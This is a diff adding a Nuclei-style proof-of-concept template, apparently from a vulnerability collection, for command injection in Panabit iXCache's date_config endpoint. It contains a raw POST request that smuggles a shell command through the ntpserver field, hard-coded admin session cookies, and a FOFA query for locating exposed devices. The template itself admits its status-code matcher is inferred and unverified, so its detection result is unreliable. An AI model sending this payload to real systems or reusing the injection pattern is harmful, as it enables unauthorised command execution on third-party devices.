@@ -1,0 +1,36 @@
+id: poc-8df4a7a51cc60bf093c8
+info:
+  name: PanabitiXCachedate_config存在后台命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/8df4a7a51cc60bf093c855be9823b560
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 8df4a7a51cc60bf093c855be9823b560
+    fofa: + fofa`title="iXCache"`
+http:
+- raw:
+  - 'POST /cgi-bin/Maintain/date_config HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: pauser_1626709857_644740=paonline_admin_48217_16289319551;Path=/;
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+
+    Cookie: pauser_1706355982_749237=paonline_admin_54360_17068008921; pauser_965865545_617716=paonline_admin_59195_9663105331
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 107
+
+
+    ntpserver=0.0.0.0;ls&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
